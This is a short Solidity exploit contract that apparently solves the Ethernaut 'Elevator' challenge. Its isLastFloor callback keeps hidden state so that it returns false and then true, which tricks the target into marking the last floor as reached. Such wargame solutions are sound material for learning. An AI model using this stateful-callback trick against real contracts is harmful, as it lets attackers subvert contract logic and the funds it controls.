// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface Elevator {
  function goTo(uint256) external;
}
contract Building {
    address elevatorAdr=0xB936a90C63a8cA687082eDAe2a396d6ab2a7B102;
    uint top=120;
    uint secretFloor=0;
    
    //set floor to 119 and get on top floor with secret floor;
    function Attack(uint _floor)public{
        Elevator elevator=Elevator(elevatorAdr);
       
        elevator.goTo(_floor);
       
    }
   
    function isLastFloor(uint256 _floor) external  returns(bool){
        uint floor=secretFloor+_floor;            
        if(top==floor){
            secretFloor--;
            return true;
        }else{
              secretFloor++;
              return false;
        }
    }
   
   
}
